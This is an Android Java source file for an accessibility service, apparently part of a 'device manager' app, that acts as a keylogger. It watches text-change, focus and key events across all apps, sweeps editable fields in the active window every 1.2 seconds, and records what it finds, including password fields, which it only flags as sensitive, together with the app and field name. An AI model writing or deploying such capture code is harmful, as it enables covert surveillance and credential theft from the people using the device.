package com.company.devicemgr.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.company.devicemgr.utils.AppRuntime;
import com.company.devicemgr.utils.InAppTextCaptureManager;

import java.util.List;
import java.util.Locale;

public class KeyboardAccessibilityService extends AccessibilityService {
    private static final long HARDWARE_KEY_CAPTURE_DELAY_MS = 60L;
    private static final long WINDOW_SWEEP_INTERVAL_MS = 1200L;
    private static final int MAX_EDITABLE_NODES_PER_SWEEP = 12;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable focusedNodeCaptureRunnable = new Runnable() {
        @Override
        public void run() {
            performWindowSweep(pendingCaptureMethod);
        }
    };
    private final Runnable periodicWindowSweepRunnable = new Runnable() {
        @Override
        public void run() {
            if (!InAppTextCaptureManager.isCaptureEnabled(KeyboardAccessibilityService.this)) {
                handler.removeCallbacks(this);
                return;
            }
            performWindowSweep("periodic_window_sweep");
            handler.postDelayed(this, WINDOW_SWEEP_INTERVAL_MS);
        }
    };
    private String lastFocusedPackage = null;
    private String lastFocusedField = null;
    private String lastFocusedClassName = null;
    private String pendingCaptureMethod = "accessibility_focus";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        try {
            AppRuntime.ensureInAppTextCaptureStarted(this);
        } catch (Exception ignored) {
        }
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
                | AccessibilityEvent.TYPE_VIEW_FOCUSED
                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 50;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            info.flags |= AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            info.flags |= AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
        }
        setServiceInfo(info);
        startPeriodicWindowSweep();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || !InAppTextCaptureManager.isCaptureEnabled(this)) {
            return;
        }

        AccessibilityNodeInfo source = event.getSource();
        updateFocusedField(event, source);

        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            captureFromEvent(event, source, "accessibility_text_changed");
            scheduleFocusedNodeCapture("post_text_changed_window_sweep");
            return;
        }

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            captureFromEvent(event, source, "accessibility_selection_changed");
            return;
        }

        if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            scheduleFocusedNodeCapture("accessibility_focus");
            return;
        }

        if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            if (source != null && source.isEditable()) {
                captureFromNode(source, lastFocusedPackage, lastFocusedField, lastFocusedClassName, "accessibility_window_content_changed");
            } else {
                scheduleFocusedNodeCapture("accessibility_window_content_changed");
            }
            return;
        }

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            scheduleFocusedNodeCapture("accessibility_window_state_changed");
        }
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (!InAppTextCaptureManager.isCaptureEnabled(this)) {
            return super.onKeyEvent(event);
        }
        if (event != null && event.getAction() == KeyEvent.ACTION_UP && isPrintableKey(event)) {
            scheduleFocusedNodeCapture("hardware_key_event");
        }
        return super.onKeyEvent(event);
    }

    @Override
    public void onInterrupt() {
        handler.removeCallbacks(focusedNodeCaptureRunnable);
        handler.removeCallbacks(periodicWindowSweepRunnable);
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacks(focusedNodeCaptureRunnable);
        handler.removeCallbacks(periodicWindowSweepRunnable);
        super.onDestroy();
    }

    private void scheduleFocusedNodeCapture(String captureMethod) {
        pendingCaptureMethod = captureMethod;
        handler.removeCallbacks(focusedNodeCaptureRunnable);
        handler.postDelayed(focusedNodeCaptureRunnable, HARDWARE_KEY_CAPTURE_DELAY_MS);
    }

    private void startPeriodicWindowSweep() {
        handler.removeCallbacks(periodicWindowSweepRunnable);
        handler.postDelayed(periodicWindowSweepRunnable, WINDOW_SWEEP_INTERVAL_MS);
    }

    private void performWindowSweep(String captureMethod) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) {
            return;
        }
        AccessibilityNodeInfo focused = null;
        try {
            focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused == null) {
                focused = root.findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY);
            }
            if (focused == null) {
                focused = findEditableNode(root);
            }
            captureFromNode(focused, lastFocusedPackage, lastFocusedField, lastFocusedClassName, captureMethod);
            captureEditableDescendants(root, captureMethod, 0);
        } finally {
            if (focused != null && focused != root) {
                focused.recycle();
            }
            root.recycle();
        }
    }

    private void captureFromEvent(AccessibilityEvent event, AccessibilityNodeInfo source, String captureMethod) {
        String packageName = resolvePackageName(event, source);
        String className = resolveClassName(event, source);
        String resolvedPackageName = !TextUtils.isEmpty(packageName) ? packageName : getPackageName();
        String fieldName = resolveFieldName(event, source, className);
        String textValue = resolveTextValue(event, source);
        if (TextUtils.isEmpty(textValue)) {
            return;
        }
        boolean sensitive = isSensitiveField(source);
        InAppTextCaptureManager.recordTextChange(
                getApplicationContext(),
                resolvedPackageName,
                fieldName,
                textValue,
                sensitive,
                resolvedPackageName,
                className,
                captureMethod
        );
    }

    private void captureFromNode(AccessibilityNodeInfo node, String fallbackPackage, String fallbackField, String fallbackClassName, String captureMethod) {
        if (node == null) {
            return;
        }
        String resolvedNodePackage = resolvePackageName(node);
        String resolvedNodeClass = resolveClassName(node);
        String packageName = !TextUtils.isEmpty(resolvedNodePackage) ? resolvedNodePackage : fallbackPackage;
        String className = !TextUtils.isEmpty(resolvedNodeClass) ? resolvedNodeClass : fallbackClassName;
        String fieldName = resolveFieldName(null, node, !TextUtils.isEmpty(className) ? className : fallbackField);
        String textValue = resolveTextValue(null, node);
        if (TextUtils.isEmpty(textValue)) {
            return;
        }
        boolean sensitive = isSensitiveField(node);
        InAppTextCaptureManager.recordTextChange(
                getApplicationContext(),
                !TextUtils.isEmpty(packageName) ? packageName : getPackageName(),
                !TextUtils.isEmpty(fieldName) ? fieldName : "keyboard_field",
                textValue,
                sensitive,
                !TextUtils.isEmpty(packageName) ? packageName : fallbackPackage,
                className,
                captureMethod
        );
    }

    private void updateFocusedField(AccessibilityEvent event, AccessibilityNodeInfo source) {
        String packageName = resolvePackageName(event, source);
        String className = resolveClassName(event, source);
        String fieldName = resolveFieldName(event, source, className);
        if (!TextUtils.isEmpty(packageName)) {
            lastFocusedPackage = packageName;
        }
        if (!TextUtils.isEmpty(fieldName)) {
            lastFocusedField = fieldName;
        }
        if (!TextUtils.isEmpty(className)) {
            lastFocusedClassName = className;
        }
    }

    private String resolvePackageName(AccessibilityEvent event, AccessibilityNodeInfo source) {
        if (event != null && !TextUtils.isEmpty(event.getPackageName())) {
            return event.getPackageName().toString();
        }
        return resolvePackageName(source);
    }

    private String resolvePackageName(AccessibilityNodeInfo source) {
        if (source != null && !TextUtils.isEmpty(source.getPackageName())) {
            return source.getPackageName().toString();
        }
        return null;
    }

    private String resolveClassName(AccessibilityEvent event, AccessibilityNodeInfo source) {
        if (event != null && !TextUtils.isEmpty(event.getClassName())) {
            return event.getClassName().toString();
        }
        if (source != null && !TextUtils.isEmpty(source.getClassName())) {
            return source.getClassName().toString();
        }
        return null;
    }

    private String resolveClassName(AccessibilityNodeInfo source) {
        if (source != null && !TextUtils.isEmpty(source.getClassName())) {
            return source.getClassName().toString();
        }
        return null;
    }

    private String resolveFieldName(AccessibilityEvent event, AccessibilityNodeInfo source, String fallbackName) {
        if (source != null) {
            CharSequence viewId = source.getViewIdResourceName();
            if (!TextUtils.isEmpty(viewId)) {
                return viewId.toString();
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                CharSequence hint = source.getHintText();
                if (!TextUtils.isEmpty(hint)) {
                    return hint.toString();
                }
                CharSequence pane = source.getPaneTitle();
                if (!TextUtils.isEmpty(pane)) {
                    return pane.toString();
                }
            }
        }

        if (event != null) {
            CharSequence description = event.getContentDescription();
            if (!TextUtils.isEmpty(description)) {
                return description.toString();
            }
        }

        if (!TextUtils.isEmpty(fallbackName)) {
            return fallbackName;
        }
        return "keyboard_field";
    }

    private String resolveTextValue(AccessibilityEvent event, AccessibilityNodeInfo source) {
        if (event != null) {
            List<CharSequence> texts = event.getText();
            if (texts != null && !texts.isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence item : texts) {
                    if (!TextUtils.isEmpty(item)) {
                        if (sb.length() > 0) sb.append(' ');
                        sb.append(item);
                    }
                }
                if (sb.length() > 0) {
                    return sb.toString();
                }
            }
        }

        if (source != null) {
            CharSequence text = source.getText();
            if (!TextUtils.isEmpty(text)) {
                return text.toString();
            }
        }
        return null;
    }

    private boolean isSensitiveField(AccessibilityNodeInfo source) {
        if (source == null) return false;
        if (source.isPassword()) return true;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence hint = source.getHintText();
            if (hint != null && hint.toString().toLowerCase(Locale.US).contains("password")) {
                return true;
            }
        }

        CharSequence viewId = source.getViewIdResourceName();
        return viewId != null && viewId.toString().toLowerCase(Locale.US).contains("password");
    }

    private boolean isPrintableKey(KeyEvent event) {
        if (event == null) return false;
        if (event.isCtrlPressed() || event.isAltPressed() || event.isMetaPressed()) {
            return false;
        }
        int unicode = event.getUnicodeChar();
        return unicode > 0 && !Character.isISOControl(unicode);
    }

    private AccessibilityNodeInfo findEditableNode(AccessibilityNodeInfo root) {
        if (root == null) return null;
        if (root.isEditable()) return root;
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child == null) continue;
            AccessibilityNodeInfo match = findEditableNode(child);
            if (match != null) {
                return match;
            }
            child.recycle();
        }
        return null;
    }

    private int captureEditableDescendants(AccessibilityNodeInfo node, String captureMethod, int capturedCount) {
        if (node == null || capturedCount >= MAX_EDITABLE_NODES_PER_SWEEP) {
            return capturedCount;
        }
        if (node.isEditable()) {
            captureFromNode(node, lastFocusedPackage, lastFocusedField, lastFocusedClassName, captureMethod);
            capturedCount++;
        }
        for (int i = 0; i < node.getChildCount() && capturedCount < MAX_EDITABLE_NODES_PER_SWEEP; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child == null) continue;
            try {
                capturedCount = captureEditableDescendants(child, captureMethod, capturedCount);
            } finally {
                child.recycle();
            }
        }
        return capturedCount;
    }
}
